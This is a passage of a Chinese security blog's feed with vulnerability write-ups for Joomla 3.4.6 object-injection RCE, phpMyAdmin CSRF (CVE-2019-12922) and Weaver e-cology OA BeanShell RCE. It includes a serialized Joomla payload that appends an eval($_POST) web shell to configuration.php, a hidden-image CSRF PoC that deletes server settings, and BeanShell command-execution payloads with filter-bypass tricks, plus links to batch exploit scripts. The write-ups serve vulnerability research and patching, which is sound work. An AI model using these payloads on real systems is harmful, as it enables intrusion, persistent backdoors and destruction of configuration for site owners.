class="line">O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;ð</span><br></pre></td></tr></table></figure><p>前面讲过由于Joomla的会话机制Post请求会被303重定向到结果页面所以无法回显,这里的phpinfo函数就用不了<br>选择用file_put_contents函数写入一句话到configuration.php中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(&apos;configuration.php&apos;,&apos;if(isset($_POST[\\\&apos;test\\\&apos;])) eval($_POST[\\\&apos;test\\\&apos;]);\&apos;, FILE_APPEND) || $a=\&apos;http://wtf\&apos;;</span><br></pre></td></tr></table></figure><p>最终的对象如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAA&quot;;s:11:&quot;maonnalezzo&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:217:&quot;file_put_contents(&apos;configuration.php&apos;,&apos;if(isset($_POST[\&apos;ja0k\&apos;]))+eval($_POST[\&apos;ja0k\&apos;]);&apos;,+FILE_APPEND)+||+$a=&apos;http://wtf&apos;;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;s:6:&quot;return&quot;;s:102:</span><br></pre></td></tr></table></figure><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="#修复建议"></a>#修复建议</h3><p>更新至最新版本<br>官方地址<a href="https://downloads.joomla.org" target="_blank" rel="noopener">https://downloads.joomla.org</a></p><p><strong>代码及工具下载：</strong><br><a href="https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE" target="_blank" rel="noopener">https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE</a></p><p><strong>免责声明：本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。</strong></p><p>参考：<br>[1].<a href="https://cxsecurity.com/issue/WLB-2019100045" target="_blank" rel="noopener">https://cxsecurity.com/issue/WLB-2019100045</a><br>[2].<a href="https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html</a><br>[3].<a href="https://mp.weixin.qq.com/s/NG0fw-si2BchcKVz5atsdA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/NG0fw-si2BchcKVz5atsdA</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/fd87976bb0347e8a60d5929c0cd96b58.jpg&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;Author：Ja0k&lt;/p&gt;
&lt;h3 id=&quot;事件背景
      
    
    </summary>
    
    
      <category term="技术" scheme="www.ja0k.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="安全研究" scheme="www.ja0k.com/categories/%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="Web安全" scheme="www.ja0k.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="漏洞分析" scheme="www.ja0k.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="对象注入" scheme="www.ja0k.com/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>漏洞分析-CVE-2019-12922_phpMyAdmin小于等于4.9.0.1CSRF漏洞分析</title>
    <link href="www.ja0k.com/2019/09/27/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91CVE-2019-12922-phpMyAdmin%E5%B0%8F%E4%BA%8E%E7%AD%89%E4%BA%8E4-9-0-1CSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>www.ja0k.com/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析/</id>
    <published>2019-09-27T15:31:47.000Z</published>
    <updated>2019-10-31T08:24:21.503Z</updated>
    
    <content type="html"><![CDATA[<p>最近安全圈曝光了很多漏洞，之前审计了泛微 OA<br>RCE 漏洞,今天审计分析phpMyAdmin_CSRF漏洞</p><p><img src="/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析/167c922ef0588ef9c6d1ab7d094d949b.png" alt></p><p><strong>#事件背景</strong></p><p>2019年9月16日，网络上曝光phpMyAdmin4.9.0.1版本中存在跨站请求伪造漏洞，攻击者可利用该漏洞通过受影响客户端向服务器发送非预期的请求。这个漏洞影响phpMyAdmin的版本最高到4.9.0.1，这是phpMyAdmin目前最新的发行版本。因为这个漏洞危及的范围比较小，仅允许攻击者删除目标服务器里的，phpMyAdmin控制面板中关于setup页面中的服务器配置。攻击者所需要做的仅仅是发送一个精心设计的URL给网页的管理员，这个管理员需要在他的浏览器登录到phpMyAdmin控制面板，然后在同一个浏览器点击这个URL，就会不知不觉地删除了配置里的服务器。</p><p><strong>#漏洞信息</strong></p><table><thead><tr><th>漏洞名称</th><th>phpMyAdmin_CSRF漏洞</th></tr></thead><tbody><tr><td>CVE编号</td><td>CVE-2019-12922</td></tr><tr><td>CNVD编号</td><td>CNVD-2019-31657</td></tr><tr><td>影响版本</td><td>phpMyAdmin &lt;=4.9.0.1（据说phpMyAdmin 5.0.0-alpha1版也存在）</td></tr><tr><td>威胁等级</td><td>中危</td></tr><tr><td>公开时间</td><td>2019年9月16日</td></tr></tbody></table><p><strong>#漏洞分析</strong></p><p><strong>1.什么是CSRF？</strong></p><p>CSRF(Cross-site request forgery)跨站请求伪造，也被称为One Click<br>Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。</p><p><img src="/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析/9e8fc902aacf82840cccd17f90ab83bd.png" alt></p><p>上图为CSRF攻击的一个简单模型：用户访问恶意网站B，恶意网站B返回给用户的HTTP信息中要求用户访问网站A，而由于用户和网站A之间可能已经有信任关系导致这个请求就像用户真实发送的一样会被执行。</p><p><strong>2.静态审计</strong></p><p>漏洞存在于phpmyadmin/setup/index.php文件，该文件为安装phpmyadmin的脚本，可以在此脚本中创建连接新的Mysql数据库服务器</p><p><img src="/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析/ea5c75eeed8bbe3e310faaf7f9b97936.png" alt></p><p>允许get请求参数为page，</p><p><img src="/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析/2e76bc27ba4735b802e425615761071e.png" alt></p><p><img src="/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析/6130b5ae696f2c6f000d21d72fd2aa40.png" alt></p><p>再跟进到/setup/frames/$page.inc.php 也就是 /setup/frames/server.inc.php文件</p><p>这个php从Get请求获取了 mode和id这两个参数的值，</p><p>mode有三种（’edit’、’remove’、’revert’）</p><p><img src="/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析/eebbd0c7eedbe9971988ee180a396c22.png" alt></p><p>当mode=remove且Servers/$id不为null时，使用removeServer方法删除server然后Location跳转到/phpmyadmin/setup/index.php首页</p><p>我们再跟进看下phpMyAdmin/libraries/config/ConfigFile.class.php的removeServer方法  </p><p><img src="/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析/5a1eb534a668a8e9b2dc985757685037.png" alt></p><p>unset这句是关键 unset函数是销毁指定变量，在这里就是删掉$server</p><p><strong>```unset</strong>($_SESSION[$this-&gt;<strong>id</strong>][<strong>‘Servers’</strong>][$last_server]);```</p><p>导致CSRF的根据原因为phpmyamdin，没有全局token，只有在登录/phpmyadmin/index.php后，才会创建token</p><p><img src="/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析/10b4d4cf17f4b014696eee9ca0fe5114.png" alt></p><p>所以在设置服务器页面phpmyadmin/setup/index.php是没有token的，故此无法防御跨站请求伪造攻击，这样$server就通过CSRF漏洞被删除了。</p><p>但是这个漏洞不能执行Sql语句拖库，故此危害等级不高，但是利用起来很简单，攻击者只需要知道服务器的URL，就能利用CSRF漏洞删除phpmyamdi配置中的服务器。</p><p><strong>#漏洞复现</strong></p><p>在浏览器打开</p><p><a href="http://192.168.21.56/phpmyadmin/setup/index.php" target="_blank" rel="noopener">http://192.168.21.56/phpmyadmin/setup/index.php</a></p><p><img src="/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析/e1c681fc2124332bca525909b4e02d0a.png" alt></p><p>为了方便后面CSRF漏洞能够成功删除服务器成功先New一个服务器</p><p>点击New server就跳转到服务器创建页面</p><p><img src="/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析/641a471fe84ab8db1ba4a70b98d09455.png" alt></p><p>save之后跳转到之前setup/index.php页面</p><p><img src="/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析/2b26684f8324249f3f3d8562ef103f3e.png" alt></p><p>可以看到这里Delete按钮就是 Poc中的地址，点击这个delete就能删除这个server</p><p>开始复现CSRF漏洞，构造Poc，新建一个CSRF.html文件写入以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;Deleting Server 1&lt;/p&gt;</span><br><span class="line">&lt;img src=&quot;</span><br><span class="line">http://192.168.31.56/phpmyadmin/setup/index.php?page=servers&amp;mode=remove&amp;id=1&quot;;style=&quot;display:none;&quot;/&gt;</span><br></pre></td></tr></table></figure><p>在同一个浏览器中执行</p><p><img src="/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析/1246117a9b36f44eb69f2d8c8aec986d.png" alt></p><p>通过抓包设置断点可以看到该请求</p><p><img src="/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析/227138ed284c1f8710999d00723d65c7.png" alt></p><p>该请求删除了id为1的server</p><p>再返回/setup/index.php 查看发现之前新建的 id为1 ，name为11111的server被删除</p><p><img src="/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析/7216198f31517acc09ef04f6be4b2150.png" alt></p><p>本次分析复现的代码及POC会在本人的Github上分享<a href="https://github.com/securitycn/" target="_blank" rel="noopener">https://github.com/securitycn/</a></p><p><strong>#修复建议</strong></p><p>厂商尚未提供漏洞修复方案，请关注厂商主页更新： <a href="https://www.phpmyadmin.net/" target="_blank" rel="noopener">https://www.phpmyadmin.net/</a></p><p><strong>#免责声明</strong></p><p>本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。</p><p><strong>#版权</strong></p><p>本文为作者原创禁止一切非授权转载和抄袭行为，如需转载请联系在公众号后台留言（留言请说明来意），转载请注明出处及下方二维码。</p><p><strong>#求关注</strong></p><p>欢迎大家留言，喜欢文章的朋友可以关注本公众号</p><p>微信公众号：securitycn</p><p>博客：<a href="https://securitycn.github.io" target="_blank" rel="noopener">https://securitycn.github.io</a></p><p>Github: <a href="https://github.com/securitycn" target="_blank" rel="noopener">https://github.com/securitycn</a></p><p><img src="/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析/680e2a08b1f4315111b46c6638a1b045.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近安全圈曝光了很多漏洞，之前审计了泛微 OA&lt;br&gt;RCE 漏洞,今天审计分析phpMyAdmin_CSRF漏洞&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/09/27/【漏洞分析】CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析
      
    
    </summary>
    
    
      <category term="技术" scheme="www.ja0k.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="代码审计" scheme="www.ja0k.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="安全研究" scheme="www.ja0k.com/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
      <category term="Web安全" scheme="www.ja0k.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>泛微OA E-cology 远程代码执行漏洞分析、过滤器绕过及批量检测工具</title>
    <link href="www.ja0k.com/2019/09/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E6%B3%9B%E5%BE%AEOA-E-cology-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%81%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BB%95%E8%BF%87%E5%8F%8A%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7/"/>
    <id>www.ja0k.com/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/</id>
    <published>2019-09-24T14:44:48.000Z</published>
    <updated>2019-10-31T08:20:02.809Z</updated>
    
    <content type="html"><![CDATA[<p><strong>【漏洞分析】泛微OA E-cology 远程代码执行漏洞原理分析、过滤器绕过及批量检测工具</strong></p><p>Author:Ja0k</p><p><img src="/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/1cbfcf408d9b147993a123c148155c62.png" alt></p><p>最近曝光了很多漏洞，后续将对这些有代表性的漏洞进行分析审分析，今天有空先审计分析 泛微<br>OA RCE 漏洞</p><p><strong>#事件背景</strong></p><p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁，泛微e-cology OA系统的JAVA<br>Beanshell接口可被未授权访问，攻击者调用该Beanshell接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行，漏洞等级严重。</p><p><strong>#漏洞信息</strong></p><table><thead><tr><th>漏洞名称</th><th>泛微OA E-cology 远程代码执行漏洞</th></tr></thead><tbody><tr><td>CVE编号</td><td>-</td></tr><tr><td>CNVD编号</td><td>CNVD-2019-32204</td></tr><tr><td>影响版本</td><td>e-cology &lt;=9.0</td></tr><tr><td>威胁等级</td><td>高危</td></tr><tr><td>公开时间</td><td>2019年9月17日</td></tr></tbody></table><p><strong>#漏洞分析</strong></p><p>此次存在漏洞的是JAVA Beanshell接口，现在了解下Beanshell的基础。</p><p><strong>1. BeanShell 知识</strong>（来源：<a href="https://github.com/beanshell/beanshell）" target="_blank" rel="noopener">https://github.com/beanshell/beanshell）</a></p><p>BeanShell是一个小型的，免费的，可嵌入的Java源解释器，具有使用Java编写的对象脚本语言功能。<br>BeanShell动态执行标准Java语法，并通过通用的脚本编写便利进行扩展，例如松散的类型，命令和方法闭包（如Perl和JavaScript）。</p><p>可以交互地使用BeanShell进行Java实验和调试，以及以新方式扩展应用程序。</p><p>Beanshell可以执行print、dir、eval、exec等命令</p><p><img src="/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/738014ac4eaac4c4be029ad813f66dd5.png" alt></p><p>页面如下图</p><p><img src="/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/9f296e4a5ebea20d9e3bfe6892495883.png" alt></p><p><strong>2.</strong> 泛微中Beanshell库jar代码静态分析</p><p>从泛微里提取存在漏洞的lib文件 bsh-2.0b4.jar 反编译查看servlet.BshServlet这个类</p><p><img src="/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/525c13e7c7c8730006b7c7d90aeac9f3.png" alt></p><p>在类中发现doGet和doPost方法，用来接收并执行提交的数据。</p><p>doPost实际上就是对doGet的二次封装</p><p><img src="/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/953c8c686a598793b8fa08725e4bf8f4.png" alt></p><p>在doGet方法中看到调用evalScript方法创建一个名为obj的对象，再看evalScript这个方法中的pramString参数，最终会被interpreter.eval处理。如下图</p><p><img src="/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/f9df8f6704f1096a36b6c776a2c6955b.png" alt></p><p>跟进 bsh.Interpreter类的eval方法</p><p><img src="/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/242c9b5c7f5c7a5703e5b8e288d36f66.png" alt></p><p>跳转到bsh.classpath/ClassManagerImpl.class类</p><p><img src="/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/f71f2f2dea777c58ceaf51929c5522b0.png" alt></p><p>该类调用了bsh.commands/exec.bsh脚本，该脚本可以执行命令</p><p><img src="/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/d36c4dc028b98fbae54a7bb612a666e4.png" alt></p><p><strong>#漏洞复现</strong></p><ol><li><strong>泛微OA BeanShell复现测试</strong></li></ol><p><img src="/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/611c89ea0c26109acb074e13709e18e0.png" alt></p><p>把print(“hello!”)换成exec(“whoami”)，就可以测试能否执行系统命令了。</p><p>Poc1: bsh.script=\u0065\u0078\u0065\u0063(“whoami”);&amp;bsh.servlet.output=raw</p><p><img src="/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/c72547461819c49c9e7edd8896bca8e5.png" alt></p><p>如果有全局过滤器过滤了exec或eval，会有报错，如下图：</p><p><img src="/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/854d8e0be236a472ace811444bc3667f.png" alt></p><p>可以采用unicode编码、字符串拼接等方式绕过,见下图：</p><p>Poc2: bsh.script=\u0065\u0078\u0065\u0063(“whoami”);&amp;bsh.servlet.output=raw</p><p><img src="/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/694b9be88cb74bfbcbf4268e2493272d.png" alt></p><p>Poc3：</p><p>bsh.script=eval%00(“ex”%2b”ec(bsh.httpServletRequest.getParameter(\“command\“))”);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw&amp;command=whoami</p><p><img src="/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/c946285789271139ddb4fba29a0153c0.png" alt></p><p><strong>2. 批量验证脚本</strong></p><p>该脚本拼接了常用的泛微OA web路径，结合了本文讲解绕过过滤器的3个Poc</p><p>该工具仅用于测试研究使用请勿他用。</p><p><img src="/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/949ec3bcbc877d3df5f3371c99468a34.png" alt></p><p><strong>3.本文用到的文件下载地址</strong></p><p>泛微OA中提取的Beanshell库：</p><p><a href="https://github.com/SecurityCN/Vulnerability-analysis/blob/master/0917/weaver-oa/CNVD-2019-32204/bsh-2.0b4.jar" target="_blank" rel="noopener">https://github.com/SecurityCN/Vulnerability-analysis/blob/master/0917/weaver-oa/CNVD-2019-32204/bsh-2.0b4.jar</a></p><p>批量脚本：</p><p><a href="https://github.com/SecurityCN/Vulnerability-analysis/blob/master/0917/weaver-oa/CNVD-2019-32204/Weaver-Ecology-OA_RCE-EXP.py" target="_blank" rel="noopener">https://github.com/SecurityCN/Vulnerability-analysis/blob/master/0917/weaver-oa/CNVD-2019-32204/Weaver-Ecology-OA_RCE-EXP.py</a></p><p><strong>#免责声明</strong></p><p>本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;【漏洞分析】泛微OA E-cology 远程代码执行漏洞原理分析、过滤器绕过及批量检测工具&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Author:Ja0k&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/09/24/【漏洞分析】泛微OA-E-cology-远程代码执行
      
    
    </summary>
    
    
      <category term="技术" scheme="www.ja0k.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="代码审计" scheme="www.ja0k.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="Web安全" scheme="www.ja0k.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="漏洞分析" scheme="www.ja0k.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
